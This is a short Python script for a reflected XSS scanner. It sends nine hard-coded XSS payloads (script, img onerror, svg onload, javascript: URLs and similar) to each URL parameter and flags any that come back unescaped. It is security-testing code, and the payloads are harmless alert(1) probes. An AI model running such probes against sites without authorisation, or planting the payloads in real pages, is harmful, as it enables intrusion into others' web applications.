import requests

def scan_xss(url, params):
    # XSS payloads
    payloads = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "<img src='x' onerror='alert(1)'>",
        "<svg onload='alert(1)'>",
        "javascript:alert(1)",
        "<body onload='alert(1)'>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<marquee/onstart=alert(1)>",
        "<input/onfocus=alert(1)>"
    ]
    
    vulnerabilities = []
    
    for param in params:
        for payload in payloads:
            test_params = {key: (payload if key == param else value) for key, value in params.items()}
            
            try:
                response = requests.get(url, params=test_params)
                if payload in response.text:
                    vulnerabilities.append((param, payload))
            except requests.RequestException as reqexception:
                print(f"Request failed: {reqexception}")
    
    return vulnerabilities
